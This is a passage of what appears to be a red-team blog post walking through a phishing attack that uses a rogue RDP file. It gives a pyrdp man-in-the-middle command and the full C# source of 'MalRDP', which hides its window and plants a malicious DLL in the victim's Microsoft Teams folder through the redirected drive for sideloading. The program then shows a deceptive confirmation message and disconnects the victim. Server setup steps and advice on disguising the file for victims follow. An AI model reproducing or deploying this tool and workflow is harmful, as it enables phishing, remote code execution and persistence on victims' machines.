<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">Bash WSL</span><span role="button" tabindex="0" data-code="pyrdp-mitm.py 127.0.0.1:3389 -u tsuser -p StrongP@ssw0rd --listen 443 -c /etc/letsencrypt/live/malrdp/fullchain.pem -k /etc/letsencrypt/live/malrdp/privkey.pem" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #88C0D0">pyrdp-mitm.py</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">127.0</span><span style="color: #A3BE8C">.0.1:3389</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-u</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">tsuser</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-p</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">StrongP@ssw0rd</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--listen</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">443</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-c</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/etc/letsencrypt/live/malrdp/fullchain.pem</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-k</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/etc/letsencrypt/live/malrdp/privkey.pem</span></span></code></pre></div>



<p>If you try out your malrdp.rdp phish right now you would see no SSL warning and the connection would go through without the need for credentials from the victim:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="739" height="472" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-test-rdp-connection-1.png" alt="" class="wp-image-463" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-test-rdp-connection-1.png 739w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-test-rdp-connection-1-300x192.png 300w" sizes="(max-width: 739px) 100vw, 739px"></figure>



<p>You would also notice that the RDP session have access to the victim’s host filesystem:</p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="531" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-test-rdp-connection-2-1024x531.png" alt="" class="wp-image-464" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-test-rdp-connection-2-1024x531.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-test-rdp-connection-2-300x156.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-test-rdp-connection-2-768x398.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-test-rdp-connection-2.png 1136w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Now we are ready for the fun part…</p>



<h2 class="wp-block-heading">Weaponization</h2>



<p>Currently we only have an RDP file that would automatically connect to our server without the need for credentials and would expose the victim’s host filesystem to our server. Now we need to exploit this level of access. There are few ways to go about this but for the sake of keeping this simple we would use a contrived scenario of which we would plant a DLL in the victim’s host filesystem, specifically the Microsoft Teams AppData folder, to be sideloaded every time the victim runs Microsoft Teams. The creation of the Sideloadable DLL is out of the scope of this blog post. As for other exploit scenarios, I encourage you to use your imagination 🙂</p>



<p>I created a simple C# program I call MalRDP that, when ran, will connect to the victim’s host filesystem (C drive specifically) and look for any Microsoft Teams AppData folder it has access to and copy the Sideloadable DLL to the Teams folder with the name dbghelp.dll. This would ensure that the next time Microsoft Teams will run it would load our malicious DLL that we’ve planted in our victim’s filesystem and we gain code execution (and also persistence if you think about it) on the victim’s machine! Again, the DLL is out of scope of this blog post but in my case the DLL inject a <a href="https://github.com/HavocFramework/Havoc"><strong><em>havoc C2</em></strong></a> shellcode implant. After the DLL planting process is finished, MalRDP will let the user know that he is going to get disconnected from the server (as per the phishing pretext) and then disconnect the victim to prevent him from snooping around our RDP server and to allow for the next victim to also fall for this phish.</p>



<p>I might extend MalRDP to allow for modular configuration but this is merely a POC for now and I also want to wait for Mike’s <a rel="noreferrer noopener" href="https://github.com/ustayready/roguerdp" data-type="URL" data-id="https://github.com/ustayready/roguerdp" target="_blank"><strong><em>Rouge RDP</em></strong></a> that would undoubtedly be better than anything I may come up with, so again, be on the lookout for the release of <a rel="noreferrer noopener" href="https://github.com/ustayready/roguerdp" data-type="URL" data-id="https://github.com/ustayready/roguerdp" target="_blank"><strong><em>Rouge RDP</em></strong></a> (I know I am…).</p>



<p>Here is the code for MalRDP:</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-has-line-numbers cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;--cbp-line-number-color:#d8dee9ff;--cbp-line-number-width:15.40625px;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">C# MalRDP.cs</span><span role="button" tabindex="0" data-code="using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace MalRDP
{
    class Program
    {
        [DllImport(&quot;wtsapi32.dll&quot;, SetLastError = true)]
        static extern bool WTSLogoffSession(IntPtr hServer, int sessionId, bool bWait);

        [DllImport(&quot;kernel32.dll&quot;)]
        static extern IntPtr GetConsoleWindow();

        [DllImport(&quot;user32.dll&quot;)]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int WTS_CURRENT_SESSION = -1;
        static readonly IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            try
            {
                List<string> user_directories = Directory.GetDirectories(@&quot;\\tsclient\C\Users\&quot;).ToList();
                foreach (string dir in user_directories)
                {
                    try
                    {
                        if (dir.EndsWith(&quot;Default&quot;) || dir.EndsWith(&quot;Default User&quot;) || dir.EndsWith(&quot;Public&quot;) || dir.EndsWith(&quot;All Users&quot;))
                            continue;

                        string userTeamsFolder = $@&quot;{dir}\AppData\Local\Microsoft\Teams\current&quot;;
                        if (Directory.Exists(userTeamsFolder))
                        {
                            File.Copy(@&quot;C:\Netlogon\mal.dll&quot;, $@&quot;{userTeamsFolder}\dbghelp.dll&quot;);
                            break;
                        }
                            
                    }
                    catch { }
                }
            }
            catch { }

            MessageBox.Show(&quot;Your remote access have been verified.\nThank you for your cooperation.\nNo further action is needed.&quot;);
            WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, false);
        }
    }
}" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #81A1C1">using</span><span style="color: #D8DEE9FF"> System</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #81A1C1">using</span><span style="color: #D8DEE9FF"> System.Collections.Generic</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #81A1C1">using</span><span style="color: #D8DEE9FF"> System.IO</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #81A1C1">using</span><span style="color: #D8DEE9FF"> System.Linq</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #81A1C1">using</span><span style="color: #D8DEE9FF"> System.Runtime.InteropServices</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #81A1C1">using</span><span style="color: #D8DEE9FF"> System.Windows.Forms</span><span style="color: #81A1C1">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #81A1C1">namespace</span><span style="color: #D8DEE9FF"> MalRDP</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #81A1C1">class</span><span style="color: #D8DEE9FF"> </span><span style="color: #8FBCBB">Program</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">DllImport</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">"</span><span style="color: #A3BE8C">wtsapi32.dll</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> SetLastError </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">true</span><span style="color: #ECEFF4">)]</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">static</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">extern</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">bool</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">WTSLogoffSession</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">IntPtr hServer</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">int</span><span style="color: #D8DEE9FF"> sessionId</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">bool</span><span style="color: #D8DEE9FF"> bWait</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">DllImport</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">"</span><span style="color: #A3BE8C">kernel32.dll</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">)]</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">static</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">extern</span><span style="color: #D8DEE9FF"> IntPtr </span><span style="color: #88C0D0">GetConsoleWindow</span><span style="color: #ECEFF4">()</span><span style="color: #81A1C1">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">DllImport</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">"</span><span style="color: #A3BE8C">user32.dll</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">)]</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">static</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">extern</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">bool</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">ShowWindow</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">IntPtr hWnd</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">int</span><span style="color: #D8DEE9FF"> nCmdShow</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">const</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">int</span><span style="color: #D8DEE9FF"> SW_HIDE </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">const</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">int</span><span style="color: #D8DEE9FF"> WTS_CURRENT_SESSION </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">-</span><span style="color: #B48EAD">1</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">static</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">readonly</span><span style="color: #D8DEE9FF"> IntPtr WTS_CURRENT_SERVER_HANDLE </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">IntPtr</span><span style="color: #ECEFF4">.</span><span style="color: #D8DEE9">Zero</span><span style="color: #81A1C1">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #81A1C1">static</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">void</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">Main</span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">string</span><span style="color: #ECEFF4">[]</span><span style="color: #D8DEE9FF"> args</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #81A1C1">var</span><span style="color: #D8DEE9FF"> handle </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">GetConsoleWindow</span><span style="color: #ECEFF4">()</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #88C0D0">ShowWindow</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9">handle</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">SW_HIDE</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #81A1C1">try</span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">                List</span><span style="color: #ECEFF4">&lt;</span><span style="color: #81A1C1">string</span><span style="color: #ECEFF4">&gt;</span><span style="color: #D8DEE9FF"> user_directories </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">Directory</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">GetDirectories</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">@"</span><span style="color: #A3BE8C">\\tsclient\C\Users\</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">).</span><span style="color: #88C0D0">ToList</span><span style="color: #ECEFF4">()</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span><span style="color: #81A1C1">foreach</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">string</span><span style="color: #D8DEE9FF"> dir </span><span style="color: #81A1C1">in</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">user_directories</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    </span><span style="color: #81A1C1">try</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">                        </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9">dir</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">EndsWith</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">"</span><span style="color: #A3BE8C">Default</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">||</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">dir</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">EndsWith</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">"</span><span style="color: #A3BE8C">Default User</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">||</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">dir</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">EndsWith</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">"</span><span style="color: #A3BE8C">Public</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">||</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">dir</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">EndsWith</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">"</span><span style="color: #A3BE8C">All Users</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">))</span></span>
<span class="line"><span style="color: #D8DEE9FF">                            </span><span style="color: #81A1C1">continue;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #D8DEE9FF">                        </span><span style="color: #81A1C1">string</span><span style="color: #D8DEE9FF"> userTeamsFolder </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">$@"{</span><span style="color: #D8DEE9">dir</span><span style="color: #ECEFF4">}</span><span style="color: #A3BE8C">\AppData\Local\Microsoft\Teams\current</span><span style="color: #ECEFF4">"</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">                        </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9">Directory</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">Exists</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9">userTeamsFolder</span><span style="color: #ECEFF4">))</span></span>
<span class="line"><span style="color: #D8DEE9FF">                        </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">                            </span><span style="color: #D8DEE9">File</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">Copy</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">@"</span><span style="color: #A3BE8C">C:\Netlogon\mal.dll</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">$@"{</span><span style="color: #D8DEE9">userTeamsFolder</span><span style="color: #ECEFF4">}</span><span style="color: #A3BE8C">\dbghelp.dll</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">                            </span><span style="color: #81A1C1">break;</span></span>
<span class="line"><span style="color: #D8DEE9FF">                        </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">                            </span></span>
<span class="line"><span style="color: #D8DEE9FF">                    </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">                    </span><span style="color: #81A1C1">catch</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">                </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #81A1C1">catch</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #D8DEE9">MessageBox</span><span style="color: #ECEFF4">.</span><span style="color: #88C0D0">Show</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">"</span><span style="color: #A3BE8C">Your remote access have been verified.</span><span style="color: #EBCB8B">\n</span><span style="color: #A3BE8C">Thank you for your cooperation.</span><span style="color: #EBCB8B">\n</span><span style="color: #A3BE8C">No further action is needed.</span><span style="color: #ECEFF4">"</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">            </span><span style="color: #88C0D0">WTSLogoffSession</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9">WTS_CURRENT_SERVER_HANDLE</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #D8DEE9">WTS_CURRENT_SESSION</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">false</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>So in order to configure the weaponization process I compiled MalRDP and the malicious DLL that it will plant and copied them to our EC2 server in a folder I created at C:\Netlogon. I also created a bat file that would simply run the MalRDP.exe and called it tsuser.bat</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="848" height="357" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-netlogon-folder.png" alt="" class="wp-image-465" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-netlogon-folder.png 848w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-netlogon-folder-300x126.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-netlogon-folder-768x323.png 768w" sizes="(max-width: 848px) 100vw, 848px"></figure>



<p>Now we need to set the tsuser.bat as the logon script for the tsuser. By doing so we are making sure that MalRDP would run every time a victim is connecting to our RDP server. We can set it up by opening <strong><em>Computer Management -&gt; System Tools -&gt; Local Users and Groups -&gt; Users -&gt; DOUBLE CLICK ON tsuser -&gt; Profile -&gt; set the Logon Script field as “tsuser.bat”</em></strong>.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="927" height="522" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-computer-management-tsuser-logon-script.png" alt="" class="wp-image-466" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-computer-management-tsuser-logon-script.png 927w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-computer-management-tsuser-logon-script-300x169.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-computer-management-tsuser-logon-script-768x432.png 768w" sizes="(max-width: 927px) 100vw, 927px"></figure>



<p>Last thing to do is to share the C:\Netlogon folder and make sure <em><strong>Everyone</strong> </em>group has read access to it. <strong><em>Right click on the Netlogon folder -&gt; Properties -&gt; Sharing -&gt; Advanced Sharing -&gt; check the box “Share this folder” -&gt; Permissions -&gt; make sure that Everyone group has read access</em></strong>.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="848" height="357" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-netlogon-folder-1.png" alt="" class="wp-image-467" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-netlogon-folder-1.png 848w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-netlogon-folder-1-300x126.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-netlogon-folder-1-768x323.png 768w" sizes="(max-width: 848px) 100vw, 848px"></figure>



<h2 class="wp-block-heading">Let’s Phish!</h2>



<p>That’s it, we are ready to send the malrdp.rdp file to our victim – just remember to rename it, I don’t think any victim would click on a file named malrdp.rdp LOL.</p>



<p>And also don’t forget to start pyrdp…</p>



<p>The final results can be viewed as a video POC at the top of the blog post.</p>



<h2 class="wp-block-heading">Acknowledgments</h2>



<p>Any and all credits goes to <a rel="noreferrer noopener" href="https://twitter.com/ustayready" data-type="URL" data-id="https://twitter.com/ustayready" target="_blank"><strong><em>Mike Felch @ustayready</em></strong></a> for coming up with this technique and making the webcast that helped me implement this technique myself.</p>



<p>And let us not forget <a rel="noreferrer noopener" href="https://www.gosecure.net/blog/2020/10/20/announcing-pyrdp-1-0/" data-type="URL" data-id="https://www.gosecure.net/blog/2020/10/20/announcing-pyrdp-1-0/" target="_blank"><strong><em>GoSecure</em></strong> </a>for their awesome <a rel="noreferrer noopener" href="https://github.com/GoSecure/pyrdp" data-type="URL" data-id="https://github.com/GoSecure/pyrdp" target="_blank"><strong><em>pyrdp</em></strong> </a>as well.</p>
</span></div></div><div id="div_block-133-115" class="ct-div-block"><h3 id="headline-134-115" class="ct-headline">Share</h3><div id="shortcode-188-115" class="ct-shortcode"><div class="addtoany_shortcode"><div class="a2a_kit a2a_kit_size_36 addtoany_list" data-a2a-url="https://shorsec.io/blog/malrdp-implementing-rouge-rdp-manually/" data-a2a-title="MalRDP: Implementing Rouge RDP Manually" style="line-height: 36px;"><a class="a2a_button_email" href="/#email" title="Email" rel="nofollow noopener" target="_blank"><img src="/wp-content/uploads/addtoany/icons/custom/email.png" width="36" height="36" alt="Email"></a><a class="a2a_button_twitter" href="/#twitter" title="Twitter" rel="nofollow noopener" target="_blank"><img src="/wp-content/uploads/addtoany/icons/custom/twitter.png" width="36" height="36" alt="Twitter"></a><a class="a2a_button_linkedin" href="/#linkedin" title="LinkedIn" rel="nofollow noopener" target="_blank"><img src="/wp-content/uploads/addtoany/icons/custom/linkedin.png" width="36" height="36" alt="LinkedIn"></a><a class="a2a_button_whatsapp" href="/#whatsapp" title="WhatsApp" rel="nofollow noopener" target="_blank"><img src="/wp-content/uploads/addtoany/icons/custom/whatsapp.png" width="36" height="36" alt="WhatsApp"></a></div></div></div></div></div></div></section><section id="section-29-115" class=" ct-section ct-section-with-shape-divider"><div class="ct-section-inner-wrap">
		<div id="-shape-divider-30-115" class="oxy-shape-divider divider-top ">        
        <div class="oxy_shape_divider oxy_shape_divider_top" style="transform:  scaleY(-1) scaleX(-1)">
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1920 138" preserveAspectRatio="none">   <image xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAB4AAAACKCAYAAABLnlcuAAAIL0lEQVR4nO3d21EbWRSG0X0cASEoBCYDHIIzwBmQgcnAk4EhgvFEYCYCiwhGIZDBcfUgF67BliX17VzWqtIDr928/dX7SznnHAAAAAAAELGLiKf9b7v/+zGl9ODZAEAdDMAAAAAAABxjGIE/R8Q/KaWtJwYAZTIAAwAAAABwquHL4PuIuEsp7Tw9ACiHARgAAAAAgDHuhjHYmWgAKIMBGAAAAACAKQwD8HtfBAPAut54/gAAAAAATOAqIv7NOX/KOW88UABYhwEYAAAAAIApXUfE15zzjacKAMtzAhoAAAAAgLk4Cw0ACzMAAwAAAAAwp2H8fZdS2nrKADA/J6ABAAAAAJjTZn8S+tZTBoD5GYABAAAAAFjCByMwAMzPAAwAAAAAwFKMwAAwMwMwAAAAAABLMgIDwIwMwAAAAAAALM0IDAAzSTnn7OECAAAAALCC65TSvQcPANMxAAMAAAAAsJaniHibUtp6AwAwDQMwAAAAAABr2kXEHymlJ28BAMbTAAYAAAAAYE2biPjoDQDANAzAAAAAAACs7TrnfOMtAMB4TkADAAAAAFACPWAAmIABGAAAAACAUugBA8BITkADAAAAAFAKPWAAGMkADAAAAABASfSAAWAEJ6ABAAAAACiNHjAAnMkADAAAAABAifSAAeAMTkADAAAAAFAiPWAAOIMBGAAAAACAUukBA8CJnIAGAAAAAKBkesAAcAIDMAAAAAAApdMDBoAjOQENAAAAAEDp9IAB4EgGYAAAAAAAaqAHDABHcAIaAAAAAIBa6AEDwG8YgAEAAAAAqIkeMAAc4AQ0AAAAAAA10QMGgAMMwAAAAAAA1EYPGAB+wQloAAAAAABq9LQ/Bb3z9gDghS+AAQAAAACo0UVEfMk5X3h7APDCAAwAAAAAQK2GHvAHbw8AXhiAAQAAAACo2Y0eMAC80AAGAAAAAKB2esAAsOcLYAAAAAAAaqcHDAB7BmAAAAAAAFqgBwxA98IADAAAAABAQ/SAAeieBjAAAAAAAC3RAwaga74ABgAAAACgJXrAAHTNAAwAAAAAQGv0g